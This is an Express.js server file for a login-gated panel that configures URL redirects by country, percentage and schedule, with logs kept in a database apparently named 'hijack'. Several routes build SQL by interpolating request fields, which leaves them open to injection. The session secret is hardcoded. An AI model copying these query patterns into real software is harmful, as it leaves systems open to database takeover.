process.on('unhandledRejection', (reason, p) => {
  console.error('Unhandled Rejection at:', p, 'reason:', reason);
});
process.on('uncaughtException', (error) => {
  console.error(`Caught exception: ${error}\n` + `Exception origin: ${error.stack}`);
});

const config = require('./settings');
const express = require("express");
const pug = require("pug");
const path = require('path');
const session = require('express-session');
const {DBService, mysql, connection} = require('./db/serviceDB');

const app = express();
app.set("view engine", "pug");
app.set('views', __dirname + '/views');
app.use(express.static(__dirname + "./public"));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'static')));

app.use(session({
    secret: 'secret',
    resave: true,
    saveUninitialized: true
}));


app.get('/', function (req, res) {
    // Render login template
    if (req.session.loggedin) res.redirect('/home');
    else res.sendFile(path.join(__dirname + '/views/login.html'));
});

app.get("/home", async function (req, res, next) {
    try {
        if (req.session.loggedin) {
            res.render("config", {ag_key: config.ag_key})
        } else {
            // Not logged in
            res.redirect('/');
        }
        res.end();
    } catch (error) {
        console.error("Error fetching data:", error);
        res.status(500).json({ error: "An error occurred while fetching data." });
    }
});

app.post("/submit", async (req, res) => {
	if (req.session.loggedin) {
		let { url, url_redirect, colddown, country, redirect_percent, start_time, end_time, sunday, monday, tuesday, wednesday, thursday, friday, saturday } = req.body
		const days = [sunday, monday, tuesday, wednesday, thursday, friday, saturday].filter(function (element) {
			return element !== undefined;
		}).join(',');
		try {
			//insert to db
			if(Array.isArray(country)){
				country = country.join(",")
			} 
			if(!country){
				country = ''
			}
			connection.query(`INSERT INTO configs (url,url_redirect,country,redirect_percent,start_time,end_time,days,cache_period) VALUES ("${url}", `+mysql.escape(url_redirect)+`, "${country}","${redirect_percent}","${start_time}","${end_time}","${days}","${colddown}");`)
			res.send("Success")
		} catch (error) {
			console.log("ERROR", error);
		}
	} else {
		res.status(500).json({ error: "An error occurred while fetching data." });
	}
});
app.put("/config/update", async (req, res) => {
    try {
      console.log(req.body);
        let { url, url_redirect, colddown, country, redirect_percent, start_time, end_time, days, id } = req.body
        if (req.session.loggedin) {
            if(Array.isArray(country)){
                country = country.join(",")
            }
         //   console.log(`UPDATE configs SET url="${url}",url_redirect=`+mysql.escape(url_redirect)+`,country="${country}",redirect_percent="${redirect_percent}",start_time="${start_time}",end_time="${end_time}",days="${days}",cache_period="${colddown}" Where id="${id}"`);
            connection.query(`UPDATE configs SET url="${url}",url_redirect=`+mysql.escape(url_redirect)+`,country="${country}",redirect_percent="${redirect_percent}",start_time="${start_time}",end_time="${end_time}",days="${days}",cache_period="${colddown}" Where id="${id}"`)
            res.send("Success")
        } else {
            // Not logged in
            res.redirect('/');
        }
        res.end();
    } catch (error) {
        console.error("Error fetching data:", error);
        res.status(500).json({ error: "An error occurred while fetching data." });
    }
});
app.post("/config/data", async (req, res) => {
    try {
        if (req.session.loggedin) {
            const logs = await new Promise(response => {
                DBService.getData(req.body,'configs', (rows, lastRow) => {
                    response({success:true, rows, lastRow})
                });
            })
            res.json(logs)
        } else {
            // Not logged in
            res.redirect('/');
        }
        res.end();
    } catch (error) {
        console.error("Error fetching data:", error);
        res.status(500).json({ error: "An error occurred while fetching data." });
    }
});

app.delete("/delete/:id", async (req, res) => {
	if (req.session.loggedin) {
		const id = req.params.id;
		try {
			connection.query(`DELETE FROM configs WHERE id=("${id}");`);
			res.send("Success");
		} catch (error) {
			console.log("ERROR", error);
		}
	} else {
		res.status(500).json({ error: "An error occurred while fetching data." });
	}
});

app.get("/logs", (req, res) => {
    try {
        if (req.session.loggedin) {
        res.render("logs", {ag_key: config.ag_key})
        } else {
            // Not logged in
            res.redirect('/');
        }
        res.end();
    } catch (error) {
        console.error("Error fetching data:", error);
        res.status(500).json({ error: "An error occurred while fetching data." });
    }
});
app.post("/logs/data", async (req, res) => {
    try {
        if (req.session.loggedin) {
            const logs = await new Promise(response => {
                DBService.getData(req.body,'logs', (rows, lastRow) => {
                    response({success:true,rows,lastRow})
                });
            })
            res.json(logs)
        } else {
            // Not logged in
            res.redirect('/');
        }
        res.end();
    } catch (error) {
        console.error("Error fetching data:", error);
        res.status(500).json({ error: "An error occurred while fetching data." });
    }
});
app.get("/logs/count", async (req, res) => {
    try {
        if (req.session.loggedin) {
				let count = await DBService.sqlExec(`select COUNT(*) AS total FROM hijack.logs;`);
                res.json(count[0].total)
        } else {
            // Not logged in
            res.redirect('/');
        }
        res.end();
    } catch (error) {
        console.error("Error fetching data:", error);
        res.status(500).json({ error: "An error occurred while fetching data." });
    }
});

app.post("/logs/count", async (req, res) => {
    try {
        if (req.session.loggedin) {
			let where = await DBService.createWhereSql(req.body);
			let count = await DBService.sqlExec(`select COUNT(*) AS total FROM hijack.logs `+where+`;`);
			res.json(count[0].total)
        } else {
            // Not logged in
            res.redirect('/');
        }
        res.end();
    } catch (error) {
        console.error("Error fetching data:", error);
        res.status(500).json({ error: "An error occurred while fetching data." });
    }
});
app.post("/auth", async (req, res, next) => {
    try {
        const { username, password } = req.body
        if (username && password) {
			let authResult = await DBService.sqlExec('SELECT * FROM users WHERE username = ? AND password = ?', [username, password]);
			console.log(authResult);
			
			 if (authResult.length > 0 && authResult[0].username == username) {
				// Authenticate the user
				req.session.loggedin = true;
				req.session.username = username;
				// Redirect to home page
				res.redirect('/home')
				next()
			} else {
				res.send('Incorrect Username and/or Password!');
			}
			res.end();
        }

    } catch (error) {
        console.error("Error fetching data:", error);
        res.status(500).json({ error: "An error occurred while fetching data." });
    }
});

app.get('/logout', function (request, response) {
    request.session.loggedin = false;
    request.session.username = '';
    response.redirect('/');
});

app.listen(config.port, '0.0.0.0', () => {
    console.log(
        `======= App listening on port ${config.port}! =======`
    );
});